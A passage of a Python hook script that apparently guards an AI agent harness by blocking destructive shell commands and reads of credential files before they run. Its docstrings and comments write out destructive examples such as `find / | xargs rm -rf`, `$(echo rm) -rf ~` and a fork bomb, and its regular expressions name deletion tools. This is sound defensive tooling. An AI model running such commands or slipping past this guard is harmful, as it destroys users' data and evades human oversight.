    """(start, end, body) of each $(...) and `...` outside single quotes, in the original text."""
    out, i, q = [], 0, ""
    while i < len(cmd):
        c = cmd[i]
        if q == "'":
            q = "" if c == "'" else q
        elif c == "'" and q == "":
            q = "'"
        elif c == '"':
            q = "" if q == '"' else '"'
        elif c == "`":
            k = cmd.find("`", i + 1)
            k = len(cmd) if k == -1 else k
            out.append((i, k + 1, cmd[i + 1:k]))
            i = k
        elif cmd.startswith("$(", i):
            level, k = 0, i + 1
            while k < len(cmd):
                level += cmd[k] == "("
                level -= cmd[k] == ")"
                if level == 0:
                    break
                k += 1
            out.append((i, k + 1, cmd[i + 2:k]))
            i = k
        i += 1
    return out


def check_computed(cmd):
    """A command whose NAME, or whose target, only a substitution computes cannot be read before it runs.

    `(` and `$(` split segments, so `$(echo rm) -rf ~` reaches check_segment as `-rf ~` with no command
    word, and `find $(echo ~) -delete` as a find with no start point. These were this repo's pinned
    known gaps; the text is read here instead, failing closed on a destroyer it cannot resolve."""
    for start, end, body in _subst_spans(cmd):
        before = cmd[:start].rstrip().rstrip('"').rstrip()
        at_command = not before or before[-1] in ";&|(\n" or re.search(r"(^|[^\w])eval$", before)
        if at_command and DESTROYER_WORD.search(body):
            block("a command whose name a substitution computes (%s) cannot be read before it runs"
                  % body.strip()[:60])
        if re.search(r"(^|[;&|(\s])find\s*$", before):
            tail = re.split(r"[;&|]", cmd[end:], 1)[0]
            if re.search(r"(^|\s)-(delete|exec(dir)?\s+(\S*/)?(rm|shred|truncate|dd|unlink))\b", tail):
                block("find over a path only a substitution computes (%s), then deletes" % body.strip()[:60])
    m = re.search(r"\|\s*xargs\b[^;&|]*?(^|\s)(\S*/)?(rm|shred|unlink|rmdir|truncate)(\s|$)", cmd)
    if m and _subst_spans(cmd[:m.start()]):
        block("xargs %s fed by a substitution: its targets cannot be read before it runs" % m.group(3))


def check_xargs(pipes):
    """`find / | xargs rm -rf` and `echo ~ | xargs rm -rf` are `rm -rf /` and `rm -rf ~`."""
    for pipe in pipes:
        for k in range(1, len(pipe)):
            words = pipe[k][0]
            if not any(os.path.basename(w) == "xargs" for w in words[:3]):
                continue
            name, _ = unwrap(words)
            if name not in ("rm", "shred", "unlink", "rmdir", "truncate"):
                continue
            for prev_words, _ in pipe[:k]:
                prev, pargs = unwrap(prev_words)
                if prev == "find":
                    scoped = any(a in ("-name", "-iname", "-path", "-ipath") for a in pargs)
                    for a in pargs:
                        if a.startswith("-") or a in ("(", "!"):
                            break
                        why = critical(a)
                        if why and not (scoped and "top-level folder" in why):
                            block("find %s piped into xargs %s (%s)" % (a, name, why))
                if prev in ("echo", "printf"):
                    for a in pargs:
                        why = None if a.startswith("-") else critical_path(a)
                        if why:
                            block("xargs %s fed %s (%s)" % (name, a, why))


def check(cmd, depth=0):
    if depth > MAX_DEPTH or not cmd.strip():
        return
    # Quoted text is data: `echo ':(){ :|:& };:' >> notes.md` writes a note. A quoted bomb that is
    # really run (`bash -c '...'`) is unquoted one level down, where this check sees it again.
    bare = QUOTED.sub("''", cmd)
    for rx in FORK_BOMB:
        if rx.search(bare if rx is not FORK_BOMB[-1] else cmd):
            block("fork bomb")
    check_computed(strip_heredocs(cmd))
    for inner in substitutions(strip_heredocs(cmd)):  # $(...) and `...` run even inside "..."
        check(inner, depth + 1)
    for name, body in process_substitutions(strip_heredocs(cmd)):
        if name in SHELLS or name in ("source", "."):  # `bash <(echo ...)` is `echo ... | bash`
            check(body + " | bash", depth + 1)
    pipes = pipelines(tokenize(cmd))
    check_remote_exec(cmd, pipes)
    check_piped_script(pipes, depth)
    check_xargs(pipes)
    for pipe in pipes:
        for words, redirs in pipe:
            name, args = unwrap(words)
            check_segment(name, args, redirs, depth)


def verdict(cmd, cwd=None):
    """Return None if allowed, else the reason. `cwd` is the session's directory, if known."""
    _CWD[0] = _DIR[0] = None
    _BASE[0] = posixpath.normpath(cwd) if isinstance(cwd, str) and cwd.startswith("/") else None
    _APPEND.clear()
    try:
        check(cmd)
    except Blocked as e:
        return str(e)
    return None


def verdict_for_payload(payload):
    tool = str(payload.get("tool_name") or "")
    ti = payload.get("tool_input") or {}
    if not isinstance(ti, dict):
        return "tool_input is not an object"
    cmd = ti.get("command")
    if isinstance(cmd, list):
        cmd = " ".join(shlex.quote(str(c)) for c in cmd)
    if isinstance(cmd, str):
        return verdict(cmd, payload.get("cwd"))
    if "command" in ti:
        return "the command is neither a string nor a list; failing closed"
    for key in ("file_path", "path", "notebook_path"):
        p = ti.get(key)
        if isinstance(p, str) and (SECRET.search(p) and not p.endswith(".pub")
                                   or ENV_FILE.search(p) and not ENV_OK.search(p)):
            return "%s on a credential file (%s)" % (tool or "tool", p)
    return None


def main(argv=None):
    argv = sys.argv[1:] if argv is None else argv
    if argv and argv[0] == "--check":
        reason = verdict(" ".join(argv[1:]))
    else:
        try:
            payload = json.loads(sys.stdin.read())
            if not isinstance(payload, dict):
                raise ValueError("payload is not an object")
            reason = verdict_for_payload(payload)
        except (ValueError, UnicodeDecodeError) as e:
            reason = "hook payload could not be parsed (%s); failing closed" % e
    if reason:
        sys.stderr.write("agent-harness guard blocked this: %s. If it is really intended, "
                         "ask the human to run it themselves.\n" % reason)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
